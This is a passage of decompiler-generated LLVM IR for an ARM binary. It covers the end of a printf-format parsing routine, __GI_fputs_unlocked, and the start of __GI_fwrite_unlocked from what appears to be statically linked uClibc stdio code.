  %v2_13a84 = inttoptr i32 %v1_13a84 to i8*
  %v3_13a84 = load i8, i8* %v2_13a84, align 1
  %v4_13a84 = zext i8 %v3_13a84 to i32
  store i32 %v4_13a84, i32* %r2.global-to-local, align 4
  %v3_13a88 = inttoptr i32 %v2_13a7c to i8*
  %v4_13a88 = load i8, i8* %v3_13a88, align 2
  %v6_13a88 = zext i8 %v4_13a88 to i32
  %v3_13a8c = mul nuw i32 %v4_13a78, 16777216
  store i32 %v3_13a8c, i32* %r1.global-to-local, align 4
  %v4_13a90 = sdiv i32 %v3_13a8c, 65536
  %v5_13a90 = or i32 %v6_13a80, %v4_13a90
  %v3_13a94 = mul nuw i32 %v4_13a84, 16777216
  store i32 %v3_13a94, i32* %r2.global-to-local, align 4
  %v4_13a98 = sdiv i32 %v3_13a94, 65536
  %v5_13a98 = or i32 %v6_13a88, %v4_13a98
  store i32 %v5_13a98, i32* %r3.global-to-local, align 4
  %v0_13a9c = load i32, i32* @lr, align 4
  %v2_13a9c = or i32 %v5_13a90, %v0_13a9c
  store i32 ptrtoint ([21 x i8]* @global_var_1ff24.1065 to i32), i32* %ip.global-to-local, align 4
  %v2_13aa4 = and i32 %v2_13a9c, %v5_13a98
  store i32 %v2_13aa4, i32* %r0.global-to-local, align 4
  %v0_13ac0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13ab8

dec_label_pc_13aac:                               ; preds = %dec_label_pc_13a28
  %v1_13aac = add i32 %v1_13a38, 1
  %v2_13aac = inttoptr i32 %v1_13aac to i8*
  %v3_13aac = load i8, i8* %v2_13aac, align 1
  %v4_13aac = zext i8 %v3_13aac to i32
  store i32 %v4_13aac, i32* %r3.global-to-local, align 4
  store i32 %v1_13aac, i32* %ip.global-to-local, align 4
  %v2_13ab0 = icmp eq i8 %v3_13aac, 0
  br i1 %v2_13ab0, label %dec_label_pc_13ab8, label %dec_label_pc_13a28

dec_label_pc_13ab8:                               ; preds = %dec_label_pc_13aac, %dec_label_pc_13a60
  %v0_13ac4 = phi i32 [ %v0_13a9c, %dec_label_pc_13a60 ], [ %v3_13a18, %dec_label_pc_13aac ]
  %v0_13ac0 = phi i32 [ %v0_13ac0.pre, %dec_label_pc_13a60 ], [ %v0_13a0c, %dec_label_pc_13aac ]
  %v0_13ab8 = phi i32 [ %v2_13aa4, %dec_label_pc_13a60 ], [ %v3_13a24, %dec_label_pc_13aac ]
  store i32 %v0_13ab8, i32* %stack_var_-36, align 4
  %v0_13abc = load i32, i32* @r4, align 4
  %v1_13abc = and i32 %v0_13abc, 4
  %v1_13ac0 = inttoptr i32 %v0_13ac0 to i8*
  %v2_13ac0 = load i8, i8* %v1_13ac0, align 1
  %v3_13ac0 = zext i8 %v2_13ac0 to i32
  store i32 %v3_13ac0, i32* %r1.global-to-local, align 4
  %v1_13ac4 = and i32 %v0_13ac4, 3840
  %v1_13ac8 = and i32 %v0_13abc, -5
  %v2_13acc = or i32 %v1_13ac8, %v1_13ac4
  store i32 %v2_13acc, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %tmp164 = mul nuw nsw i32 %v1_13abc, 4
  %tmp165 = or i32 %tmp164, 32
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  %v1_13adc = load i32, i32* %r7.global-to-local, align 4
  %v2_13adc = add i32 %v1_13adc, 12
  %v3_13adc = inttoptr i32 %v2_13adc to i32*
  store i32 %v3_13ac0, i32* %v3_13adc, align 4
  %v0_13ae0 = load i32, i32* %r7.global-to-local, align 4
  %v1_13ae0 = add i32 %v0_13ae0, 4
  %v2_13ae0 = inttoptr i32 %v1_13ae0 to i32*
  %v3_13ae0 = load i32, i32* @r5, align 4
  store i32 %v3_13ae0, i32* %v2_13ae0, align 4
  %v4_13ae0 = add i32 %v0_13ae0, 8
  %v5_13ae0 = inttoptr i32 %v4_13ae0 to i32*
  %v6_13ae0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v6_13ae0, i32* %v5_13ae0, align 4
  %v0_13ae4 = load i32, i32* %r3.global-to-local, align 4
  %v1_13ae4 = load i32, i32* %r7.global-to-local, align 4
  %v2_13ae4 = add i32 %v1_13ae4, 20
  %v3_13ae4 = inttoptr i32 %v2_13ae4 to i32*
  store i32 %v0_13ae4, i32* %v3_13ae4, align 4
  %v0_13ae8 = load i32, i32* %r2.global-to-local, align 4
  %v1_13ae8 = load i32, i32* %r7.global-to-local, align 4
  %v2_13ae8 = add i32 %v1_13ae8, 16
  %v3_13ae8 = inttoptr i32 %v2_13ae8 to i32*
  store i32 %v0_13ae8, i32* %v3_13ae8, align 4
  %v0_13aec = load i32, i32* %r0.global-to-local, align 4
  %v1_13aec = load i32, i32* %r7.global-to-local, align 4
  %v2_13aec = add i32 %v1_13aec, 28
  %v3_13aec = inttoptr i32 %v2_13aec to i32*
  store i32 %v0_13aec, i32* %v3_13aec, align 4
  %v0_13af0 = load i32, i32* %ip.global-to-local, align 4
  %v1_13af0 = inttoptr i32 %v0_13af0 to i8*
  %v2_13af0 = load i8, i8* %v1_13af0, align 1
  %v3_13af0 = zext i8 %v2_13af0 to i32
  store i32 %v3_13af0, i32* %r2.global-to-local, align 4
  %v2_13af4 = icmp eq i8 %v2_13af0, 0
  br i1 %v2_13af4, label %dec_label_pc_13afc, label %dec_label_pc_13b14

dec_label_pc_13afc:                               ; preds = %dec_label_pc_13ab8
  %v0_13afc = load i32, i32* %r6.global-to-local, align 4
  %v1_13afc = inttoptr i32 %v0_13afc to i8*
  %v2_13afc = load i8, i8* %v1_13afc, align 1
  %v3_13afc = zext i8 %v2_13afc to i32
  store i32 %v3_13afc, i32* %r3.global-to-local, align 4
  %v7_13b00 = icmp eq i8 %v2_13afc, 109
  br i1 %v7_13b00, label %dec_label_pc_13b08, label %dec_label_pc_13c18

dec_label_pc_13b08:                               ; preds = %dec_label_pc_13afc
  store i32 20, i32* %r3.global-to-local, align 4
  %v1_13b0c = load i32, i32* %r7.global-to-local, align 4
  %v2_13b0c = add i32 %v1_13b0c, 32
  %v3_13b0c = inttoptr i32 %v2_13b0c to i32*
  store i32 20, i32* %v3_13b0c, align 4
  %v0_13b10 = load i32, i32* %r2.global-to-local, align 4
  %v1_13b10 = load i32, i32* %r7.global-to-local, align 4
  %v2_13b10 = add i32 %v1_13b10, 28
  %v3_13b10 = inttoptr i32 %v2_13b10 to i32*
  store i32 %v0_13b10, i32* %v3_13b10, align 4
  br label %dec_label_pc_13b14

dec_label_pc_13b14:                               ; preds = %dec_label_pc_13ab8, %dec_label_pc_13b08
  %v0_13b14 = load i32, i32* %sb.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_13b14, 1
  br i1 %tmp141, label %dec_label_pc_13bcc, label %dec_label_pc_13b1c

dec_label_pc_13b1c:                               ; preds = %dec_label_pc_13b14
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13b20

dec_label_pc_13b20:                               ; preds = %dec_label_pc_13bb4, %dec_label_pc_13b1c
  %v8_13b3c = phi i32 [ 0, %dec_label_pc_13b1c ], [ %v1_13bb8, %dec_label_pc_13bb4 ]
  %v7_13b24 = icmp sgt i32 %v8_13b3c, 2
  br i1 %v7_13b24, label %bb143, label %bb142

bb142:                                            ; preds = %dec_label_pc_13b20
  store i32 %v25_13784, i32* %r2.global-to-local, align 4
  %v12_13b28 = mul i32 %v8_13b3c, 4
  %v13_13b28 = add i32 %v12_13b28, %v25_13784
  store i32 %v13_13b28, i32* %r3.global-to-local, align 4
  %v9_13b2c = add i32 %v13_13b28, -24
  %v10_13b2c = inttoptr i32 %v9_13b2c to i32*
  %v11_13b2c = load i32, i32* %v10_13b2c, align 4
  store i32 %v11_13b2c, i32* %r2.global-to-local, align 4
  %v9_13b30 = load i32, i32* %r7.global-to-local, align 4
  %v10_13b30 = add i32 %v9_13b30, %v8_13b3c
  store i32 %v10_13b30, i32* %r3.global-to-local, align 4
  %v9_13b38 = trunc i32 %v11_13b2c to i8
  %v11_13b38 = add i32 %v10_13b30, 36
  %v12_13b38 = inttoptr i32 %v11_13b38 to i8*
  store i8 %v9_13b38, i8* %v12_13b38, align 1
  %v8_13b40 = load i32, i32* %r3.global-to-local, align 4
  %v9_13b40 = add i32 %v8_13b40, 36
  %v10_13b40 = inttoptr i32 %v9_13b40 to i8*
  %v11_13b40 = load i8, i8* %v10_13b40, align 1
  %v12_13b40 = zext i8 %v11_13b40 to i32
  br label %bb144

bb143:                                            ; preds = %dec_label_pc_13b20
  %v10_13b3c = add i32 %v8_13b3c, %stack_var_-48.3
  store i32 %v10_13b3c, i32* %r3.global-to-local, align 4
  %v9_13b44 = add i32 %v10_13b3c, -2
  br label %bb144

bb144:                                            ; preds = %bb142, %bb143
  %v0_13b68 = phi i32 [ %v12_13b40, %bb142 ], [ %v9_13b44, %bb143 ]
  store i32 %v0_13b68, i32* @r2, align 4
  %v1_13b48 = load i32, i32* %sb.global-to-local, align 4
  %v2_13b48 = sub i32 %v0_13b68, %v1_13b48
  %v4_13b48 = xor i32 %v1_13b48, %v0_13b68
  %v5_13b48 = xor i32 %v2_13b48, %v0_13b68
  %v6_13b48 = and i32 %v5_13b48, %v4_13b48
  %v7_13b48 = icmp slt i32 %v6_13b48, 0
  %v8_13b48 = icmp slt i32 %v2_13b48, 0
  %v9_13b48 = icmp eq i32 %v0_13b68, %v1_13b48
  %v3_13b4c = xor i1 %v8_13b48, %v7_13b48
  %v4_13b4c = or i1 %v9_13b48, %v3_13b4c
  br i1 %v4_13b4c, label %dec_label_pc_13b5c, label %dec_label_pc_13b50

dec_label_pc_13b50:                               ; preds = %bb144
  %v1_13b50 = add i32 %v0_13b68, -9
  %v3_13b50 = sub i32 8, %v0_13b68
  %v4_13b50 = and i32 %v3_13b50, %v0_13b68
  %v5_13b50 = icmp slt i32 %v4_13b50, 0
  %v6_13b50 = icmp slt i32 %v1_13b50, 0
  %v7_13b50 = icmp eq i32 %v0_13b68, 9
  %v3_13b54 = xor i1 %v6_13b50, %v5_13b50
  %v4_13b54 = or i1 %v7_13b50, %v3_13b54
  br i1 %v4_13b54, label %dec_label_pc_13b58, label %dec_label_pc_13c18

dec_label_pc_13b58:                               ; preds = %dec_label_pc_13b50
  store i32 %v0_13b68, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13b5c

dec_label_pc_13b5c:                               ; preds = %bb144, %dec_label_pc_13b58
  store i32 %v25_13784, i32* %ip.global-to-local, align 4
  %v1_13b60 = load i32, i32* %r8.global-to-local, align 4
  %v4_13b60 = mul i32 %v1_13b60, 4
  %v5_13b60 = add i32 %v4_13b60, %v25_13784
  store i32 %v5_13b60, i32* %r3.global-to-local, align 4
  %v1_13b64 = add i32 %v5_13b60, -12
  %v2_13b64 = inttoptr i32 %v1_13b64 to i32*
  %v3_13b64 = load i32, i32* %v2_13b64, align 4
  store i32 %v3_13b64, i32* %r5.global-to-local, align 4
  %v1_13b68 = add i32 %v0_13b68, -1
  store i32 %v1_13b68, i32* %sl.global-to-local, align 4
  %v0_13b6c = load i32, i32* %r7.global-to-local, align 4
  %v4_13b6c = mul i32 %v1_13b68, 4
  %v5_13b6c = add i32 %v0_13b6c, %v4_13b6c
  store i32 %v5_13b6c, i32* %r3.global-to-local, align 4
  %v7_13b70 = icmp eq i32 %v3_13b64, 8
  %v1_13b74 = add i32 %v5_13b6c, 40
  %v2_13b74 = inttoptr i32 %v1_13b74 to i32*
  %v3_13b74 = load i32, i32* %v2_13b74, align 4
  store i32 %v3_13b74, i32* @r0, align 4
  br i1 %v7_13b70, label %dec_label_pc_13bb4, label %dec_label_pc_13b7c

dec_label_pc_13b7c:                               ; preds = %dec_label_pc_13b5c
  %v9_13b7c = icmp eq i32 %v3_13b74, %v3_13b64
  br i1 %v9_13b7c, label %dec_label_pc_13ba0, label %bb145

bb145:                                            ; preds = %dec_label_pc_13b7c
  %v8_13b80 = icmp eq i32 %v3_13b74, 8
  br i1 %v8_13b80, label %dec_label_pc_13ba0, label %dec_label_pc_13b88

dec_label_pc_13b88:                               ; preds = %bb145
  %v0_13b88 = call i32 @_promoted_size()
  %v0_13b90 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13b90, i32* @r0, align 4
  %v0_13b94 = call i32 @_promoted_size()
  store i32 %v0_13b94, i32* %r0.global-to-local, align 4
  %v8_13b9c = icmp sgt i32 %v0_13b88, %v0_13b94
  br i1 %v8_13b9c, label %dec_label_pc_13bb4, label %dec_label_pc_13b88.dec_label_pc_13ba0_crit_edge

dec_label_pc_13b88.dec_label_pc_13ba0_crit_edge:  ; preds = %dec_label_pc_13b88
  %v1_13ba4.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_13bac.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_13bac.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_13ba0

dec_label_pc_13ba0:                               ; preds = %dec_label_pc_13b88.dec_label_pc_13ba0_crit_edge, %dec_label_pc_13b7c, %bb145
  %v1_13bac = phi i32 [ %v1_13bac.pre, %dec_label_pc_13b88.dec_label_pc_13ba0_crit_edge ], [ %v1_13b68, %dec_label_pc_13b7c ], [ %v1_13b68, %bb145 ]
  %v0_13bac = phi i32 [ %v0_13bac.pre, %dec_label_pc_13b88.dec_label_pc_13ba0_crit_edge ], [ %v0_13b6c, %dec_label_pc_13b7c ], [ %v0_13b6c, %bb145 ]
  %v1_13ba4 = phi i32 [ %v1_13ba4.pre, %dec_label_pc_13b88.dec_label_pc_13ba0_crit_edge ], [ %v1_13b60, %dec_label_pc_13b7c ], [ %v1_13b60, %bb145 ]
  store i32 %v25_13784, i32* %r1.global-to-local, align 4
  %v4_13ba4 = mul i32 %v1_13ba4, 4
  %v5_13ba4 = add i32 %v4_13ba4, %v25_13784
  store i32 %v5_13ba4, i32* %r3.global-to-local, align 4
  %v1_13ba8 = add i32 %v5_13ba4, -12
  %v2_13ba8 = inttoptr i32 %v1_13ba8 to i32*
  %v3_13ba8 = load i32, i32* %v2_13ba8, align 4
  store i32 %v3_13ba8, i32* @r2, align 4
  %v4_13bac = mul i32 %v1_13bac, 4
  %v5_13bac = add i32 %v4_13bac, %v0_13bac
  store i32 %v5_13bac, i32* %r3.global-to-local, align 4
  %v2_13bb0 = add i32 %v5_13bac, 40
  %v3_13bb0 = inttoptr i32 %v2_13bb0 to i32*
  store i32 %v3_13ba8, i32* %v3_13bb0, align 4
  br label %dec_label_pc_13bb4

dec_label_pc_13bb4:                               ; preds = %dec_label_pc_13b88, %dec_label_pc_13b5c, %dec_label_pc_13ba0
  %v0_13bb4 = load i32, i32* %r7.global-to-local, align 4
  %v1_13bb4 = add i32 %v0_13bb4, 28
  %v2_13bb4 = inttoptr i32 %v1_13bb4 to i32*
  %v3_13bb4 = load i32, i32* %v2_13bb4, align 4
  %v0_13bb8 = load i32, i32* %r8.global-to-local, align 4
  %v1_13bb8 = add i32 %v0_13bb8, 1
  store i32 %v1_13bb8, i32* %r8.global-to-local, align 4
  %v1_13bbc = add i32 %v3_13bb4, 2
  store i32 %v1_13bbc, i32* %r3.global-to-local, align 4
  %v6_13bc4 = icmp slt i32 %v1_13bb8, %v1_13bbc
  br i1 %v6_13bc4, label %dec_label_pc_13b20, label %dec_label_pc_13be4

dec_label_pc_13bcc:                               ; preds = %dec_label_pc_13b14
  %v0_13bcc = load i32, i32* %r7.global-to-local, align 4
  %v1_13bcc = add i32 %v0_13bcc, 28
  %v2_13bcc = inttoptr i32 %v1_13bcc to i32*
  %v3_13bcc = load i32, i32* %v2_13bcc, align 4
  store i32 %v3_13bcc, i32* %r2.global-to-local, align 4
  %v0_13bd0 = load i32, i32* %r0.global-to-local, align 4
  %v1_13bd0 = trunc i32 %v0_13bd0 to i8
  %v3_13bd0 = add i32 %v0_13bcc, 38
  %v4_13bd0 = inttoptr i32 %v3_13bd0 to i8*
  store i8 %v1_13bd0, i8* %v4_13bd0, align 1
  %v0_13bd4 = load i32, i32* %r2.global-to-local, align 4
  %v3_13bd4 = mul i32 %v0_13bd4, 4
  store i32 %v3_13bd4, i32* @r2, align 4
  %v0_13bd8 = load i32, i32* %r7.global-to-local, align 4
  %v1_13bd8 = add i32 %v0_13bd8, 40
  store i32 %v1_13bd8, i32* @r0, align 4
  %v2_13bdc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13bdc, i32* @r1, align 4
  %v0_13be0 = call i32 @memcpy()
  store i32 %v0_13be0, i32* %r0.global-to-local, align 4
  %v0_13be4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13be4

dec_label_pc_13be4:                               ; preds = %dec_label_pc_13bb4, %dec_label_pc_13bcc
  %v2_13c00 = phi i32 [ %v0_13be4.pre, %dec_label_pc_13bcc ], [ %v0_13bb4, %dec_label_pc_13bb4 ]
  %v1_13be4 = add i32 %v2_13c00, 16
  %v2_13be4 = inttoptr i32 %v1_13be4 to i32*
  %v3_13be4 = load i32, i32* %v2_13be4, align 4
  store i32 %v3_13be4, i32* %r3.global-to-local, align 4
  %v1_13be8 = and i32 %v3_13be4, 128
  %v2_13be8 = icmp eq i32 %v1_13be8, 0
  br i1 %v2_13be8, label %.thread46, label %.thread44

.thread44:                                        ; preds = %dec_label_pc_13be4
  store i32 %v2_1378c, i32* %r3.global-to-local, align 4
  %v2_13bf0 = inttoptr i32 %v2_13c00 to i32*
  %v3_13bf0 = load i32, i32* %v2_13bf0, align 4
  %v2_13bf8.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_13bf8 = sub i32 %v2_13bf8.pre, %v2_1378c
  store i32 %v3_13bf8, i32* %r3.global-to-local, align 4
  %v5_13bfc = mul i32 %v3_13bf8, 4
  %v6_13bfc = add i32 %v5_13bfc, %v3_13bf0
  store i32 %v6_13bfc, i32* @r2, align 4
  br label %bb146

.thread46:                                        ; preds = %dec_label_pc_13be4
  %v1_13bf441 = load i32, i32* %r6.global-to-local, align 4
  %v2_13bf442 = add i32 %v1_13bf441, 1
  store i32 %v2_13bf442, i32* %r3.global-to-local, align 4
  %v3_13c00 = inttoptr i32 %v2_13c00 to i32*
  store i32 %v2_13bf442, i32* %v3_13c00, align 4
  %v0_13c04.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb146

bb146:                                            ; preds = %.thread44, %.thread46
  %v1_13c0c = phi i32 [ %v2_13c00, %.thread44 ], [ %v0_13c04.pre, %.thread46 ]
  %v1_13c04 = add i32 %v1_13c0c, 28
  %v2_13c04 = inttoptr i32 %v1_13c04 to i32*
  %v3_13c04 = load i32, i32* %v2_13c04, align 4
  store i32 %v3_13c04, i32* %r3.global-to-local, align 4
  %v1_13c08 = add i32 %v3_13c04, 2
  store i32 %v1_13c08, i32* %r0.global-to-local, align 4
  %v0_13c0c = load i32, i32* %sb.global-to-local, align 4
  %v2_13c0c = add i32 %v1_13c0c, 24
  %v3_13c0c = inttoptr i32 %v2_13c0c to i32*
  store i32 %v0_13c0c, i32* %v3_13c0c, align 4
  br i1 %v2_13be8, label %dec_label_pc_13c1c, label %bb147

bb147:                                            ; preds = %bb146
  %v1_13c10 = load i32, i32* @r2, align 4
  %v2_13c10 = load i32, i32* %r7.global-to-local, align 4
  %v3_13c10 = inttoptr i32 %v2_13c10 to i32*
  store i32 %v1_13c10, i32* %v3_13c10, align 4
  br label %dec_label_pc_13c1c

dec_label_pc_13c18:                               ; preds = %dec_label_pc_137d4, %dec_label_pc_138e0, %dec_label_pc_13990, %dec_label_pc_13964, %dec_label_pc_13970, %dec_label_pc_138b0, %dec_label_pc_13b50, %dec_label_pc_13afc, %.thread25
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13c1c

dec_label_pc_13c1c:                               ; preds = %bb147, %bb146, %dec_label_pc_13c18
  %v2_13c20 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_13c20, i32* @r4, align 4
  store i32 %v6_13784, i32* @r5, align 4
  %v26_13c20 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v26_13c20

; uselistorder directives
  uselistorder i32 %v3_13bf8, { 1, 0 }
  uselistorder i32 %v1_13bb8, { 1, 2, 0 }
  uselistorder i32 %v0_13b6c, { 1, 2, 0 }
  uselistorder i32 %v2_13b48, { 1, 0 }
  uselistorder i32 %v1_13b48, { 1, 0, 2 }
  uselistorder i32 %v0_13b68, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8, 10 }
  uselistorder i32 %v1_13aac, { 1, 2, 0 }
  uselistorder i32 %v3_13a94, { 1, 0 }
  uselistorder i32 %v3_13a8c, { 1, 0 }
  uselistorder i32 %v2_13a6c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_13a54, { 0, 2, 3, 1 }
  uselistorder i32 %v1_13a38, { 1, 0, 2 }
  uselistorder i32 %v3_13a18, { 2, 1, 0 }
  uselistorder i32 %v1_139dc, { 0, 2, 3, 1 }
  uselistorder i32 %v2_139b0, { 1, 0 }
  uselistorder i32 %v5_13910, { 0, 1, 3, 2 }
  uselistorder i32 %v0_13910, { 1, 0 }
  uselistorder i32 %storemerge105, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %stack_var_-48.2, { 1, 0 }
  uselistorder i32 %v2_138bc, { 1, 0 }
  uselistorder i32 %v0_138d8, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_138a0, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_13888, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v3_13874, { 1, 2, 0 }
  uselistorder i32 %v0_138ec, { 1, 2, 3, 0, 4, 7, 5, 6 }
  uselistorder i32 %stack_var_-48.1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_13828, { 1, 0 }
  uselistorder i32 %v1_137f8, { 0, 2, 1 }
  uselistorder i32 %v25_13784, { 0, 8, 1, 9, 2, 7, 3, 10, 4, 5, 6 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %sb.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 3, 2, 4, 7, 6, 5, 8 }
  uselistorder i32* %r7.global-to-local, { 4, 3, 2, 5, 9, 6, 1, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 0, 18 }
  uselistorder i32* %r6.global-to-local, { 14, 9, 12, 10, 0, 2, 13, 3, 4, 5, 7, 11, 15, 6, 1, 8 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 11, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 17, 16, 0, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 41, 42, 43, 39, 40, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 15, 11, 12, 0, 16 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 4, 6, 5, 7, 8, 9, 10, 11, 12, 23, 22, 13, 25, 14, 15, 16, 26, 17, 27, 18, 28, 19, 20, 21, 24, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 38, { 2, 0, 1 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1fef8.1073 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1ff08.1071 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_1ff24.1065 to i32), { 2, 1, 3, 0, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1fee4.1063 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 2, 3, 4, 1, 5, 0, 6, 7 }
  uselistorder label %dec_label_pc_13c1c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13c18, { 6, 7, 8, 2, 4, 3, 1, 5, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_13be4, { 1, 0 }
  uselistorder label %dec_label_pc_13bb4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13ba0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13b5c, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_13b14, { 1, 0 }
  uselistorder label %bb137, { 2, 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_139c8, { 1, 0 }
  uselistorder label %dec_label_pc_139a0, { 1, 0 }
  uselistorder label %dec_label_pc_13950, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_138d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_138cc, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1382c, { 1, 0 }
  uselistorder label %dec_label_pc_1381c, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_13c48 = load i32, i32* @r4, align 4
  store i32 %v3_13c48, i32* %stack_var_-16, align 4
  %v6_13c48 = load i32, i32* @r5, align 4
  %v9_13c48 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_13c54 = call i32 @strlen(i8* %arg1)
  store i32 %v3_13c54, i32* @r6, align 4
  %v0_13c5c = load i32, i32* @r5, align 4
  %v0_13c60 = load i32, i32* @r4, align 4
  %v5_13c6c = inttoptr i32 %v0_13c5c to i8*
  %v6_13c6c = call i32 @__GI_fwrite_unlocked(i32 %v0_13c60, i32 1, i32 %v3_13c54, i8* %v5_13c6c)
  %v1_13c70 = load i32, i32* @r6, align 4
  %v9_13c70 = icmp eq i32 %v6_13c6c, %v1_13c70
  br i1 %v9_13c70, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v14_13c78 = phi i32 [ %v6_13c6c, %entry ], [ -1, %bb ]
  %v2_13c78 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13c78, i32* @r4, align 4
  store i32 %v6_13c48, i32* @r5, align 4
  store i32 %v9_13c48, i32* @r6, align 4
  ret i32 %v14_13c78

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_13c7c = load i32, i32* @r6, align 4
  %v12_13c7c = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_13c84 = load i8, i8* %arg4, align 1
  %v4_13c84 = zext i8 %v3_13c84 to i32
  %v1_13c88 = and i32 %v4_13c84, 192
  store i32 %v1_13c88, i32* %r3.global-to-local, align 4
  %v2_13c8c = icmp eq i32 %v1_13c88, 192
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_13c8c, label %dec_label_pc_13cb4, label %dec_label_pc_13ca8

dec_label_pc_13ca8:                               ; preds = %entry
  %v4_13ca8 = call i32 @__stdio_trans2w_o(i8* nonnull %arg4, i32 128)
  %v2_13cac = icmp eq i32 %v4_13ca8, 0
  br i1 %v2_13cac, label %dec_label_pc_13ca8.dec_label_pc_13cb4_crit_edge, label %dec_label_pc_13d1c

dec_label_pc_13ca8.dec_label_pc_13cb4_crit_edge:  ; preds = %dec_label_pc_13ca8
  %v0_13cb4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13cb4

dec_label_pc_13cb4:                               ; preds = %dec_label_pc_13ca8.dec_label_pc_13cb4_crit_edge, %entry
  %v0_13cbc1 = phi i32 [ %v0_13cb4.pre, %dec_label_pc_13ca8.dec_label_pc_13cb4_crit_edge ], [ %arg2, %entry ]
  %v2_13cb4 = icmp eq i32 %v0_13cbc1, 0
  br i1 %v2_13cb4, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_13cb4
  br label %dec_label_pc_13d1c

bb:                                               ; preds = %dec_label_pc_13cb4
  %v1_13cb8 = load i32, i32* @r6, align 4
  %v3_13cb8 = icmp eq i32 %v1_13cb8, 0
  br i1 %v3_13cb8, label %dec_label_pc_13d1c, label %dec_label_pc_13cc8

dec_label_pc_13cc8:                               ; preds = %bb
  %v2_13cc8 = udiv i32 -1, %v0_13cbc1
  %v0_13cd0 = load i32, i32* @r4, align 4
  store i32 %v0_13cd0, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ugt i32 %v1_13cb8, %v2_13cc8
  br i1 %tmp10, label %dec_label_pc_13cf4, label %dec_label_pc_13cdc

dec_label_pc_13cdc:                               ; preds = %dec_label_pc_13cc8
  %v0_13cd4 = load i32, i32* @r7, align 4
  %v2_13cdc = mul i32 %v1_13cb8, %v0_13cbc1
